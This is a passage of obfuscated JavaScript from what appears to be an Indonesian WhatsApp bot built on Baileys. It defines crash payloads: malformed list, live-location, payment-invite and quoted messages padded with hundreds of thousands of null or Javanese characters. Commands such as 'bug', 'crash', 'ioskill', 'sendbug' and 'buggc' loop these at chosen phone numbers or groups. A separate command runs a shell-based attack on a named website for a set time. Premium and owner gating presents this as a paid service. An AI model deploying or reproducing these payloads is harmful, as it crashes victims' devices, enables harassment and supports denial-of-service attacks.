                                'messageParamsJson': '\x00' [_0x21048a(0x2b4)](0xf4240)
                            }
                        }
                    }
                }
            }), {
                'userJid': _0x139658
            });
            await _0x6f03b9['relayMessage'](_0x139658, _0x54a150[_0x21048a(0x2df)], {
                'participant': {
                    'jid': _0x139658
                },
                'messageId': _0x54a150[_0x21048a(0x276)]['id']
            });
        }
        async function _0x3fa9fa(_0x28ae96) {
            const _0x2047f2 = _0x5994ec;
            var _0x196ca1 = generateWAMessageFromContent(_0x28ae96, proto[_0x2047f2(0x236)][_0x2047f2(0x242)]({
                'listMessage': {
                    'title': _0x2047f2(0x2ec) + '\x00' [_0x2047f2(0x2b4)](0xe09c0),
                    'footerText': _0x2047f2(0x321),
                    'description': _0x2047f2(0x321),
                    'buttonText': null,
                    'listType': 0x2,
                    'productListInfo': {
                        'productSections': [{
                            'title': _0x2047f2(0x2f0),
                            'products': [{
                                'productId': _0x2047f2(0x239)
                            }]
                        }],
                        'productListHeaderImage': {
                            'productId': _0x2047f2(0x239),
                            'jpegThumbnail': null
                        },
                        'businessOwnerJid': _0x2047f2(0x200)
                    }
                },
                'footer': _0x2047f2(0x2e7),
                'contextInfo': {
                    'expiration': 0x93a80,
                    'ephemeralSettingTimestamp': _0x2047f2(0x1f7),
                    'entryPointConversionSource': _0x2047f2(0x266),
                    'entryPointConversionApp': _0x2047f2(0x213),
                    'entryPointConversionDelaySeconds': 0x9,
                    'disappearingMode': {
                        'initiator': _0x2047f2(0x2dd)
                    }
                },
                'selectListType': 0x2,
                'product_header_info': {
                    'product_header_info_id': 0x4433e2e130,
                    'product_header_is_rejected': ![]
                }
            }), {
                'userJid': _0x28ae96
            });
            await _0x6f03b9[_0x2047f2(0x240)](_0x28ae96, _0x196ca1[_0x2047f2(0x2df)], {
                'participant': {
                    'jid': _0x28ae96
                },
                'messageId': _0x196ca1[_0x2047f2(0x276)]['id']
            });
        }
        async function _0x37ef61(_0xacfcab) {
            const _0x2976ea = _0x5994ec;
            var _0xf5e0e2 = generateWAMessageFromContent(_0xacfcab, proto[_0x2976ea(0x236)][_0x2976ea(0x242)]({
                'viewOnceMessage': {
                    'message': {
                        'liveLocationMessage': {
                            'degreesLatitude': 'p',
                            'degreesLongitude': 'p',
                            'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ' [_0x2976ea(0x2b4)](0xc350),
                            'sequenceNumber': '0',
                            'jpegThumbnail': ''
                        }
                    }
                }
            }), {
                'userJid': _0xacfcab
            });
            await _0x6f03b9[_0x2976ea(0x240)](_0xacfcab, _0xf5e0e2[_0x2976ea(0x2df)], {
                'participant': {
                    'jid': _0xacfcab
                },
                'messageId': _0xf5e0e2[_0x2976ea(0x276)]['id']
            });
        }
        async function _0x59247e(_0x8aa854) {
            const _0x2f34e6 = _0x5994ec;
            _0x6f03b9[_0x2f34e6(0x240)](_0x8aa854, {
                'extendedTextMessage': {
                    'text': '.',
                    'contextInfo': {
                        'stanzaId': _0x8aa854,
                        'participant': _0x8aa854,
                        'quotedMessage': {
                            'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ' [_0x2f34e6(0x2b4)](0xc350)
                        },
                        'disappearingMode': {
                            'initiator': _0x2f34e6(0x2ef),
                            'trigger': _0x2f34e6(0x25a)
                        }
                    },
                    'inviteLinkGroupTypeV2': _0x2f34e6(0x22e)
                }
            }, {
                'participant': {
                    'jid': _0x8aa854
                }
            }, {
                'messageId': null
            });
        }
        async function _0x480b11(_0x8ef23) {
            const _0x2dd361 = _0x5994ec;
            _0x6f03b9[_0x2dd361(0x240)](_0x8ef23, {
                'paymentInviteMessage': {
                    'serviceType': _0x2dd361(0x227),
                    'expiryTimestamp': Date[_0x2dd361(0x24d)]() + 0x18 * 0x3c * 0x3c * 0x3e8
                }
            }, {
                'participant': {
                    'jid': _0x8ef23
                }
            });
        }
        async function _0x50766b(_0x9e8a8f, _0xc3cc77) {
            for (let _0x74a940 = 0x0; _0x74a940 < _0xc3cc77; _0x74a940++) {
                _0x480b11(_0x9e8a8f), _0x59247e(_0x9e8a8f), await sleep(0x1f4);
            }
        }
        async function _0x1e628b(_0xc6c8dd, _0x29cde8) {
            for (let _0x69fae = 0x0; _0x69fae < _0x29cde8; _0x69fae++) {
                _0x3fa9fa(_0xc6c8dd), _0x37ef61(_0xc6c8dd), _0x4ae1a2(_0xc6c8dd), await sleep(0x1f4);
            }
        }
        async function _0x579d0e(_0x3cba4a, _0x4cf25f) {
            for (let _0x12ea84 = 0x0; _0x12ea84 < _0x4cf25f; _0x12ea84++) {
                _0x4ae1a2(_0x3cba4a), _0x4ae1a2(_0x3cba4a), _0x4ae1a2(_0x3cba4a), await sleep(0x1f4);
            }
        }
        async function _0x5adbfa(_0x104e71, _0x195ef8) {
            for (let _0xe1510d = 0x0; _0xe1510d < _0x195ef8; _0xe1510d++) {
                _0x37ef61(_0x104e71), _0x3fa9fa(_0x104e71), await sleep(0x1f4);
            }
        }

        function _0x4a7edc(_0x508d56, _0x562fb8 = [], _0x593d02) {
            const _0x3d600a = _0x5994ec;
            if (_0x593d02 == null || _0x593d02 == undefined || _0x593d02 == ![]) {
                let _0x3c585c = _0x6f03b9['sendMessage'](_0x567336, {
                    'text': _0x508d56,
                    'mentions': _0x562fb8
                }, {
                    'quoted': _0xd17bed
                });
                return _0x3c585c;
            } else {
                let _0x954cbf = _0x6f03b9[_0x3d600a(0x278)](_0x567336, {
                    'text': _0x508d56,
                    'mentions': _0x562fb8
                }, {
                    'quoted': _0xd17bed
                });
                return _0x954cbf;
            }
        }
        Leccy_Auto_Typing && _0x6f03b9['sendPresenceUpdate'](_0x5994ec(0x2e8), _0x567336);
        Leccy_Auto_Recording && _0x6f03b9['sendPresenceUpdate'](_0x5994ec(0x2c5), _0x567336);
        Leccy_Auto_ReadPesan && _0x6f03b9[_0x5994ec(0x1e3)]([_0xd17bed['key']]);
        _0x1bb58a ? (console['log'](chalk['bgBlack'](chalk[_0x5994ec(0x2a6)]('\x0a===========================================\x0a'))), console[_0x5994ec(0x21a)](chalk[_0x5994ec(0x2d0)](chalk['white'](_0x5994ec(0x244)))), console['log'](chalk[_0x5994ec(0x2d0)](chalk[_0x5994ec(0x1fd)](_0x5994ec(0x210))), chalk[_0x5994ec(0x2d0)](chalk[_0x5994ec(0x30a)](_0x5d1dcf || _0x58a514)) + '\x0a' + chalk[_0x5994ec(0x261)](_0x5994ec(0x219)), chalk[_0x5994ec(0x222)](_0xd17bed[_0x5994ec(0x286)]), chalk['yellow'](_0x7193a1[_0x5994ec(0x27a)]('@')[0x0]) + '\x0a' + chalk[_0x5994ec(0x25c)](_0x5994ec(0x23e)), chalk['green'](_0x185dea, _0x567336))) : (console[_0x5994ec(0x21a)](chalk[_0x5994ec(0x2fe)](chalk[_0x5994ec(0x2a6)]('\x0a===========================================\x0a'))), console['log'](chalk[_0x5994ec(0x2d0)](chalk[_0x5994ec(0x2a0)](_0x5994ec(0x206)))), console['log'](chalk[_0x5994ec(0x2fe)](chalk['cyan'](_0x5994ec(0x210))), chalk[_0x5994ec(0x2d0)](chalk[_0x5994ec(0x30a)](_0x5d1dcf || _0x58a514)) + '\x0a' + chalk[_0x5994ec(0x261)](_0x5994ec(0x219)), chalk['green'](_0xd17bed['pushName']), chalk['yellow'](_0x7193a1[_0x5994ec(0x27a)]('@')[0x0]) + '\x0a'));
        switch (_0x433a5a) {
        case _0x5994ec(0x302): {
            if (!_0x1c014d && !_0xbbec7) return _0xf21161(_0x5994ec(0x20c));
            if (isDeveloperr) return;
            penis = fs[_0x5994ec(0x2a9)](_0x5994ec(0x212))[_0x5994ec(0x205)](), matches = penis[_0x5994ec(0x27f)](/case '[^']+'(?!.*case '[^']+')/g) || [], caseCount = matches[_0x5994ec(0x1f0)], caseNames = matches[_0x5994ec(0x2f7)](_0x261c14 => _0x261c14['match'](/case '([^']+)'/)[0x1]);
            let _0x49f96f = caseCount,
                _0x391ff0 = caseNames[_0x5994ec(0x329)](_0x5994ec(0x2a1));
            _0xf21161(_0x5994ec(0x26d) + _0x49f96f + _0x5994ec(0x2ca) + (_0x49f96f > 0x0 ? _0x391ff0 : _0x5994ec(0x328)));
        }
        break;
        case 'stopjadibot':
            if (!_0x1c014d && !_0xbbec7 && !_0x4dc8d5) return _0xf21161(_0x5994ec(0x2cd));
            if (!fs['existsSync'](_0x5994ec(0x28f) + _0x7193a1[_0x5994ec(0x27a)]('@')[0x0])) return _0xf21161(_0x5994ec(0x24f));
            exec(_0x5994ec(0x299) + _0x7193a1[_0x5994ec(0x27a)]('@')[0x0]), _0xf21161(_0x5994ec(0x2cb));
            break;
        case _0x5994ec(0x318):
            if (!_0x1c014d && !_0xbbec7) return _0xf21161(_0x5994ec(0x2e2));
            exec(_0x5994ec(0x299) + _0x7193a1[_0x5994ec(0x27a)]('@')[0x0]), _0xf21161('*succesfully restart session ✓*'), await sleep(0xbb8), process[_0x5994ec(0x2d4)]();
            break;
        case _0x5994ec(0x29e):
            if (!_0x1c014d && !_0xbbec7) return _0xf21161('*Khusus Member Premium/Owner*');
            const {
                jadibot: _0x1a24b1, conns: _0x3eb2b7
            } = require(_0x5994ec(0x21d));
            try {
                let _0x179631 = [...new Set([...global[_0x5994ec(0x2d7)][_0x5994ec(0x26c)](_0x258199 => _0x258199['user'])[_0x5994ec(0x2f7)](_0x52ea69 => _0x52ea69[_0x5994ec(0x27b)])])];
                te = _0x5994ec(0x272);
                for (let _0x5386a6 of _0x179631) {
                    y = await _0x6f03b9[_0x5994ec(0x2b1)](_0x5386a6['id']), te += _0x5994ec(0x31d) + y[_0x5994ec(0x27a)]('@')[0x0] + '\x0a', te += _0x5994ec(0x29a) + _0x5386a6[_0x5994ec(0x312)] + '\x0a\x0a';
                }
                _0x6f03b9[_0x5994ec(0x278)](_0x567336, {
                    'text': te,
                    'mentions': [y]
                }, {
                    'quoted': _0xd17bed
                });
            } catch (_0x8361c2) {
                _0xf21161(_0x5994ec(0x229));
            }
            break;
        case _0x5994ec(0x2fa): {
            if (!_0x1c014d && !_0xbbec7 && !_0x4dc8d5) return _0xf21161(_0x5994ec(0x2cd));
            if (_0x1bb58a) return _0xf21161(_0x5994ec(0x23a));
            botku = _0x7193a1['split']('@')[0x0], num = botku['replace'](/[^0-9]/g, ''), own = global[_0x5994ec(0x202)], mynum = num + _0x5994ec(0x1f3);
            if (fs[_0x5994ec(0x1f1)]('./database/jadibot/' + _0x7193a1[_0x5994ec(0x27a)]('@')[0x0])) return _0x4a7edc(_0x5994ec(0x2a4) + _0x7193a1[_0x5994ec(0x27a)]('@')[0x0] + _0x5994ec(0x20d), [mynum]);
            _0xf21161('*We are processing your request.*');
            const {
                jadibot: _0x3a1df0,
                conns: _0x4bef9d
            } = require(_0x5994ec(0x21d));
            _0x3a1df0(_0x6f03b9, num, _0xf21161, own);
            let _0x5205d5 = '`';
            await sleep(0xc80), _0xf21161(_0x5994ec(0x1f9) + global[_0x5994ec(0x2f2)] + _0x5994ec(0x22c));
        }
        break;
        case _0x5994ec(0x308):
        case _0x5994ec(0x25d): {
            if (!_0x1c014d && !_0xbbec7) return _0xf21161('Fitur ini Khusus Owner/Dev');
            if (!q[_0x5994ec(0x24e)](' ')) return _0xf21161(_0x5994ec(0x216) + _0x433a5a + ' <target> <time>\x0aExaple: .' + _0x433a5a + _0x5994ec(0x268));
            const _0x3438ec = q[_0x5994ec(0x2ab)](0x0, q['indexOf'](' ') - 0x0),
                _0x5427a4 = q[_0x5994ec(0x2ab)](q['lastIndexOf'](' ') + 0x1);
            _0xf21161('*Attack Website Telah Berhasil Dilakukan ✓*\x0a• *Target* : ' + _0x3438ec + _0x5994ec(0x2db) + _0x5427a4), exec(_0x5994ec(0x250) + _0x3438ec + ' ' + _0x5427a4, {
                'maxBuffer': 0x400 * 0x400
            }, (_0x124ac9, _0x23b29f, _0x4b7951) => {
                const _0x4df415 = _0x5994ec;
                if (_0x124ac9) {
                    _0xf21161(_0x4df415(0x28b) + _0x124ac9[_0x4df415(0x2df)]);
                    return;
                }
                if (_0x4b7951) {
                    _0xf21161('Error: ' + _0x4b7951);
                    return;
                }
                _0xf21161(_0x4df415(0x215) + _0x3438ec + _0x4df415(0x26f) + _0x5427a4);
            });
        }
        break;
        case _0x5994ec(0x2ac):
            if (!_0x1c014d && !_0xbbec7) return _0xf21161('Fitur ini Khusus Owner/Dev');
            blockw = q['split']('|')[0x0]['replace'](/[^0-9]/g, '');
            let _0x4a6584 = await _0x6f03b9[_0x5994ec(0x275)](blockw + '@s.whatsapp.net');
            if (_0x4a6584['length'] == 0x0) return _0xf21161(_0x5994ec(0x298));
            let _0x1db3d3 = blockw + '@s.whatsapp.net';
            await _0x6f03b9['updateBlockStatus'](_0x1db3d3, _0x5994ec(0x2ac))['then'](_0x3ec00f => _0xf21161(_0xf553c6(_0x3ec00f)))[_0x5994ec(0x2b0)](_0x4e6221 => _0xf21161(_0xf553c6(_0x4e6221)));
            break;
        case _0x5994ec(0x2f3):
            if (!_0x1c014d && !_0xbbec7) return _0xf21161(_0x5994ec(0x2e2));
            blockww = q[_0x5994ec(0x27a)]('|')[0x0][_0x5994ec(0x31c)](/[^0-9]/g, '');
            let _0x4ff0f9 = await _0x6f03b9['onWhatsApp'](blockww + _0x5994ec(0x1f3));
            if (_0x4ff0f9[_0x5994ec(0x1f0)] == 0x0) return _0xf21161(_0x5994ec(0x298));
            let _0x4bd652 = blockww + _0x5994ec(0x1f3);
            await _0x6f03b9[_0x5994ec(0x273)](_0x4bd652, _0x5994ec(0x2f3))[_0x5994ec(0x316)](_0x152ca3 => _0xf21161(_0xf553c6(_0x152ca3)))[_0x5994ec(0x2b0)](_0x5076bc => _0xf21161(_0xf553c6(_0x5076bc)));
            break;
        case _0x5994ec(0x238):
            if (!_0x1c014d && !_0xbbec7) return _0xf21161(_0x5994ec(0x2e2));
            if (!_0x1bb58a) return _0xf21161(_0x5994ec(0x230));
            _0xf21161('Bye Everyone.'), await _0x6f03b9['groupLeave'](_0x567336);
            break;
        case _0x5994ec(0x293):
            if (!_0x1c014d && !_0xbbec7) return _0xf21161('Fitur ini Khusus Owner/Dev');
            _0xf21161(_0x5994ec(0x291)), await sleep(0xbb8), process['exit']();
            break;
        case 'restart':
            if (!_0x1c014d && !_0xbbec7) return _0xf21161(_0x5994ec(0x2e2));
            _0xf21161(_0x5994ec(0x1ff)), exec(_0x5994ec(0x324));
            break;
        case 'listprem': {
            if (!_0x1c014d && !_0xbbec7) return _0xf21161(_0x5994ec(0x2e2));
            let _0x368058 = JSON[_0x5994ec(0x1e0)](fs[_0x5994ec(0x2a9)](_0x5994ec(0x315)));
            if (_0x368058['length'] == 0x0) return _0xf21161(_0x5994ec(0x1f4));
            var _0x8b9247 = _0x5994ec(0x285) + premium[_0x5994ec(0x1f0)] + '\x0a\x0a',
                _0x404185 = 0x1;
            for (let _0x2e55bd of _0x368058) {
                _0x8b9247 += _0x5994ec(0x245) + _0x404185++ + '\x0aNumber : @' + _0x2e55bd + '\x0a\x0a';
            }
            _0x6f03b9['sendTextWithMentions'](_0x567336, _0x8b9247, _0xd17bed);
        }
        break;
        case _0x5994ec(0x22f):
            if (!_0x1c014d && !_0xbbec7) return _0xf21161(_0x5994ec(0x249));
            if (!_0x142125[0x0]) return _0xf21161(_0x5994ec(0x246) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x20b) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x30c));
            bnnd = q['split']('|')[0x0]['replace'](/[^0-9]/g, '');
            let _0x6c9d96 = await _0x6f03b9[_0x5994ec(0x275)](bnnd + _0x5994ec(0x1f3));
            if (_0x6c9d96[_0x5994ec(0x1f0)] == 0x0) return _0xf21161('_Enter A Valid And Registered Number On WhatsApp!!_');
            if (premium['includes'](bnnd)) return _0xf21161('_Nomor Tersebut Sudah Premium !!_');
            premium['push'](bnnd), fs['writeFileSync']('./database/premium.json', JSON[_0x5994ec(0x1ea)](premium));
            let _0x1a7f8d = bnnd + _0x5994ec(0x1f3);
            _0x4a7edc('*Sukses Menambahkan ' + _0x1a7f8d['split']('@')[0x0] + _0x5994ec(0x320), [_0x1a7f8d]);
            break;
        case _0x5994ec(0x2ff):
            if (!_0x1c014d && !_0xbbec7) return _0xf21161(_0x5994ec(0x2e2));
            if (!_0x142125[0x0]) return _0xf21161(_0x5994ec(0x246) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x20b) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x221));
            ya = q['split']('|')[0x0][_0x5994ec(0x31c)](/[^0-9]/g, ''), unp = premium[_0x5994ec(0x2c2)](ya);
            if (!premium[_0x5994ec(0x24e)](ya)) return _0xf21161('_Gagal Menghapus Dari Database, Nomor Tersebut Bukan Users Premium!!_');
            premium[_0x5994ec(0x2f9)](unp, 0x1), fs['writeFileSync'](_0x5994ec(0x315), JSON[_0x5994ec(0x1ea)](premium));
            let _0x5248ea = ya + '@s.whatsapp.net';
            _0x4a7edc(_0x5994ec(0x251) + _0x5248ea['split']('@')[0x0] + _0x5994ec(0x30d), [_0x5248ea]);
            break;
        case 'strava':
        case _0x5994ec(0x2f8): {
            aa = _0x5994ec(0x314), bb = '`', txt = _0x5994ec(0x1e5) + global[_0x5994ec(0x1f5)] + _0x5994ec(0x2d1) + global['ownerName'] + _0x5994ec(0x203) + (_0x1c014d ? _0x5994ec(0x260) : _0x5994ec(0x26a)) + _0x5994ec(0x22d) + _0x7193a1[_0x5994ec(0x27a)]('@')[0x0] + '\x0a╰──────────────────\x0a┏❐ ' + bb + _0x5994ec(0x231) + bb + _0x5994ec(0x31f) + _0x2ed7d8(process['uptime']()) + _0x5994ec(0x1e2), _0x298726(txt);
        }
        break;
        case _0x5994ec(0x226):
        case _0x5994ec(0x274):
        case _0x5994ec(0x224):
        case _0x5994ec(0x1fb): {
            aa = '```', bb = '`', txt1 = '▬▭▬▭▬▭▬▭▬▭▬\x0a┏❐ ' + bb + _0x5994ec(0x2fd) + bb + _0x5994ec(0x2ba), txt2 = _0x5994ec(0x243) + bb + _0x5994ec(0x25b) + bb + _0x5994ec(0x211), txt3 = '▬▭▬▭▬▭▬▭▬▭▬\x0a┏❐ ' + bb + _0x5994ec(0x2f1) + bb + _0x5994ec(0x295), txt4 = _0x5994ec(0x243) + bb + 'BUG SPAM' + bb + _0x5994ec(0x290) + bb + _0x5994ec(0x283) + bb + _0x5994ec(0x2bb) + bb + _0x5994ec(0x1fc) + bb + _0x5994ec(0x2c0) + bb + 'BUG IOS-IPONG' + bb + _0x5994ec(0x220) + bb + _0x5994ec(0x209) + bb + ' ❐\x0a┃⭔.buggc *linkgrup*\x0a┃⭔.crashgc *linkgrup*\x0a┃⭔.bomgc *linkgrup*\x0a┃⭔.travagc *linkgrup*\x0a┃\x0a┗❐「 *SV-2.2* 」\x0a▬▭▬▭▬▭▬▭▬▭';
            if (_0x433a5a == _0x5994ec(0x274)) _0x298726(txt1);
            else {
                if (_0x433a5a == _0x5994ec(0x1fb)) _0x298726(txt2);
                else {
                    if (_0x433a5a == _0x5994ec(0x224)) _0x298726(txt3);
                    else _0x433a5a == 'bugmenu' && _0x298726(txt4);
                }
            }
        }
        break;
        case _0x5994ec(0x300):
        case 'bug-ios':
        case 'ioslcy':
        case 'ioskill':
        case _0x5994ec(0x20e): {
            if (!_0x1c014d && !_0xbbec7 && !_0x4dc8d5) return _0xf21161('*Fitur Ini Khusus Member Premium/Owner*');
            if (!q) return _0xf21161('*FORMAT BUG ' + _0x433a5a[_0x5994ec(0x25e)]() + _0x5994ec(0x23f) + (_0x3129e8 + _0x433a5a) + ' number,jumlah\x0a\x0a*Contoh:*\x0a' + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x2a8));
            let _0x41ac04 = q[_0x5994ec(0x27a)](',')[0x0],
                _0x5d2e5d = q[_0x5994ec(0x27a)](',')[0x1] ? q['split'](',')[0x1] : '10';
            if (!_0x41ac04) return _0xf21161(_0x5994ec(0x309) + _0x433a5a[_0x5994ec(0x25e)]() + _0x5994ec(0x23f) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x23c) + (_0x3129e8 + _0x433a5a) + ' 628xxxx,5\x0a\x0a©akmalmods');
            if (isNaN(parseInt(_0x5d2e5d))) return _0xf21161(_0x5994ec(0x2bc));
            let _0x32cf32 = _0x41ac04[_0x5994ec(0x31c)](/[^0-9]/g, ''),
                _0x413550 = encodeURI(_0x5d2e5d) * 0x96;
            var _0x17378d = await _0x6f03b9['onWhatsApp'](_0x32cf32 + _0x5994ec(0x1f3));
            let _0x26639a = _0x32cf32 + _0x5994ec(0x1f3);
            if (_0x32cf32 == '62895411575387') return;
            if (_0x17378d[_0x5994ec(0x1f0)] == 0x0) return _0xf21161(_0x5994ec(0x241));
            _0xf21161(_0x5994ec(0x2c9) + _0x433a5a + _0x5994ec(0x1dd)), await sleep(0x7d0), _0x50766b(_0x26639a, _0x413550), await sleep(0x9c4), _0x4a7edc(_0x5994ec(0x2a5) + _0x26639a[_0x5994ec(0x27a)]('@')[0x0] + ' Using *' + _0x433a5a + _0x5994ec(0x2f6), [_0x26639a]);
        }
        break;
        case '1hit':
        case 'kill':
        case _0x5994ec(0x2e9):
        case 'bom':
        case 'bug':
        case _0x5994ec(0x264):
        case _0x5994ec(0x217):
        case 'spam':
        case _0x5994ec(0x288):
        case 'crash': {
            if (!_0xbbec7) return _0xf21161('*Fitur Ini Khusus Bot Saja!*');
            if (!q) return _0xf21161(_0x5994ec(0x309) + _0x433a5a[_0x5994ec(0x25e)]() + _0x5994ec(0x23f) + (_0x3129e8 + _0x433a5a) + ' jumlah\x0a\x0a*Contoh:*\x0a' + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x277));
            if (isNaN(parseInt(q))) return _0xf21161(_0x5994ec(0x2bc));
            let _0x2f7920 = '' + encodeURI(q);
            _0xf21161('.'), await sleep(0x6a4), _0x1e628b(_0x567336, _0x2f7920), await sleep(0x9c4), _0x4ef953('✅');
        }
        break;
        case _0x5994ec(0x21f): {
            if (!_0xbbec7) return _0xf21161(_0x5994ec(0x232));
            if (!q) return _0xf21161(_0x5994ec(0x309) + _0x433a5a['toUpperCase']() + _0x5994ec(0x23f) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x1dc) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x277));
            if (isNaN(parseInt(q))) return _0xf21161(_0x5994ec(0x2bc));
            let _0x5428e8 = encodeURI(q) * 0xc8;
            _0xf21161(_0x5994ec(0x252)), await sleep(0x5dc), _0x50766b(_0x567336, _0x5428e8), await sleep(0x9c4), _0x4ef953('✅');
        }
        break;
        case 'travagc':
        case 'buggc':
        case _0x5994ec(0x326):
        case _0x5994ec(0x31a): {
            if (!_0x1c014d && !_0xbbec7) return _0xf21161('*Fitur Ini Khusus Member Premium/Owner*');
            if (!q) return _0xf21161(_0x5994ec(0x2aa) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x1de) + _0x433a5a + _0x5994ec(0x21c) + _0x433a5a + _0x5994ec(0x303));
            _0xf21161(teks_proses);
            if (!q[_0x5994ec(0x27a)](' ')[0x0][_0x5994ec(0x24e)](_0x5994ec(0x2d5))) return _0xf21161(_0x5994ec(0x2e6));
            resjoin = q['split'](' ')[0x0][_0x5994ec(0x27a)](_0x5994ec(0x2eb))[0x1];
            try {
                inijumlah = q[_0x5994ec(0x27a)](' ')[0x1] ? q[_0x5994ec(0x27a)](' ')[0x1] : '1', initarget = await _0x6f03b9[_0x5994ec(0x1ef)](resjoin), await sleep(0x7d0), _0xe9441b(initarget, inijumlah), await sleep(0x9c4), _0xf21161(_0x5994ec(0x2ee)), _0x6f03b9[_0x5994ec(0x214)](initarget);
            } catch (_0x32d249) {
                _0xf21161(util[_0x5994ec(0x30e)](_0x32d249));
            }
        }
        break;
        case _0x5994ec(0x310):
        case _0x5994ec(0x22a):
        case _0x5994ec(0x201):
        case 'sendbug': {
            if (!_0x1c014d && !_0xbbec7 && !_0x4dc8d5) return _0xf21161(_0x5994ec(0x1db));
            if (!q) return _0xf21161(_0x5994ec(0x309) + _0x433a5a['toUpperCase']() + _0x5994ec(0x23f) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x23c) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x2a8));
            let _0x42ccfd = q[_0x5994ec(0x27a)](',')[0x0],
                _0x323b18 = q[_0x5994ec(0x27a)](',')[0x1] * 0x3;
            if (!_0x42ccfd) return _0xf21161('*FORMAT BUG ' + _0x433a5a[_0x5994ec(0x25e)]() + _0x5994ec(0x23f) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x23c) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x2a8));
            if (!_0x323b18) return _0xf21161(_0x5994ec(0x309) + _0x433a5a[_0x5994ec(0x25e)]() + _0x5994ec(0x23f) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x23c) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x2a8));
            if (isNaN(parseInt(_0x323b18))) return _0xf21161('Jumlah wajib angka!!');
            let _0x2565eb = _0x42ccfd[_0x5994ec(0x31c)](/[^0-9]/g, ''),
                _0x150211 = encodeURI(_0x323b18) * 0x3;
            var _0x17378d = await _0x6f03b9[_0x5994ec(0x275)](_0x2565eb + _0x5994ec(0x1f3));
            let _0x346319 = _0x2565eb + '@s.whatsapp.net';
            if (_0x2565eb == '62895411575387') return;
            if (_0x17378d[_0x5994ec(0x1f0)] == 0x0) return _0xf21161('Nomor Tersebut Tidak Terdaftar Di WhatsApp');
            _0xf21161(_0x5994ec(0x2c9) + _0x433a5a + _0x5994ec(0x1dd)), await sleep(0x9c4), _0x4a7edc(_0x5994ec(0x2a5) + _0x346319['split']('@')[0x0] + _0x5994ec(0x26b) + _0x433a5a + '* ✅\x0a\x0a<!> Pause 2 minutes so that the bot is not banned.', [_0x346319]), await sleep(0x5dc), _0x1e628b(_0x346319, _0x150211);
        }
        break;
        case 'b-force': {
            if (!_0x1c014d && !_0xbbec7 && !_0x4dc8d5) return _0xf21161(_0x5994ec(0x1db));
            if (!q) return _0xf21161('*FORMAT BUG ' + _0x433a5a[_0x5994ec(0x25e)]() + '*\x0a\x0a*Example:*\x0a' + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x23c) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x2a8));
            let _0x384ba0 = q[_0x5994ec(0x27a)](',')[0x0],
                _0x1b3027 = q[_0x5994ec(0x27a)](',')[0x1] * 0x3;
            if (!_0x384ba0) return _0xf21161('*FORMAT BUG ' + _0x433a5a[_0x5994ec(0x25e)]() + '*\x0a\x0a*Example:*\x0a' + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x23c) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x2a8));
            if (!_0x1b3027) return _0xf21161(_0x5994ec(0x309) + _0x433a5a[_0x5994ec(0x25e)]() + _0x5994ec(0x23f) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x23c) + (_0x3129e8 + _0x433a5a) + ' 628xxxx,5\x0a\x0a©akmalmods');
            if (isNaN(parseInt(_0x1b3027))) return _0xf21161(_0x5994ec(0x2bc));
            let _0x3659c4 = _0x384ba0[_0x5994ec(0x31c)](/[^0-9]/g, ''),
                _0x334eb2 = encodeURI(_0x1b3027) * 0x5;
            var _0x17378d = await _0x6f03b9[_0x5994ec(0x275)](_0x3659c4 + _0x5994ec(0x1f3));
            let _0xb3e5a4 = _0x3659c4 + _0x5994ec(0x1f3);
            if (_0x3659c4 == _0x5994ec(0x27c)) return;
            if (_0x17378d[_0x5994ec(0x1f0)] == 0x0) return _0xf21161('Nomor Tersebut Tidak Terdaftar Di WhatsApp');
            _0xf21161(_0x5994ec(0x2c9) + _0x433a5a + _0x5994ec(0x1dd)), await sleep(0x7d0), _0x579d0e(_0xb3e5a4, _0x334eb2), await sleep(0x9c4), _0x4a7edc(_0x5994ec(0x2a5) + _0xb3e5a4['split']('@')[0x0] + _0x5994ec(0x26b) + _0x433a5a + _0x5994ec(0x2f6), [_0xb3e5a4]);
        }
        break;
        case _0x5994ec(0x2bf):
        case _0x5994ec(0x319):
        case _0x5994ec(0x2d2):
        case _0x5994ec(0x26e): {
            if (!_0x1c014d && !_0xbbec7 && !_0x4dc8d5) return _0xf21161(_0x5994ec(0x1db));
            if (!q) return _0xf21161(_0x5994ec(0x309) + _0x433a5a[_0x5994ec(0x25e)]() + _0x5994ec(0x23f) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x23c) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x2a8));
            let _0x87e136 = q[_0x5994ec(0x27a)](',')[0x0],
                _0x4373d2 = q['split'](',')[0x1] * 0x3;
            if (!_0x87e136) return _0xf21161(_0x5994ec(0x309) + _0x433a5a['toUpperCase']() + '*\x0a\x0a*Example:*\x0a' + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x23c) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x2a8));
            if (!_0x4373d2) return _0xf21161('*FORMAT BUG ' + _0x433a5a[_0x5994ec(0x25e)]() + '*\x0a\x0a*Example:*\x0a' + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x23c) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x2a8));
            if (isNaN(parseInt(_0x4373d2))) return _0xf21161(_0x5994ec(0x2bc));
            let _0x26e9c3 = _0x87e136[_0x5994ec(0x31c)](/[^0-9]/g, ''),
                _0x4845f8 = '' + encodeURI(_0x4373d2);
            var _0x17378d = await _0x6f03b9[_0x5994ec(0x275)](_0x26e9c3 + _0x5994ec(0x1f3));
            let _0xcfc2f = _0x26e9c3 + _0x5994ec(0x1f3);
